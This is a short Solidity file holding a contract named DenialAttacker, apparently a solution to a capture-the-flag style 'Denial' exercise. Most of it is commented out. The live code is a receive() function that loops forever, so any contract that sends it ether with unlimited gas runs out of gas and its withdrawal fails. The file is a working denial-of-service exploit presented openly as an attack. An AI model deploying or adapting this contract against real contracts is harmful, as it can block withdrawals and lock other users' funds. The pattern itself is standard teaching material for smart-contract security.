// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

// interface DenialI {
//     function withdraw() external;
// }

contract DenialAttacker {
    // DenialI denial;

    // constructor(address _denial) {
    //     denial = DenialI(_denial);
    // }

    // function callWithdraw() public {
    //     console.log("se ejecuta");
    //     denial.withdraw();
    // }

    receive() external payable {
        while (true) {}
    }
}
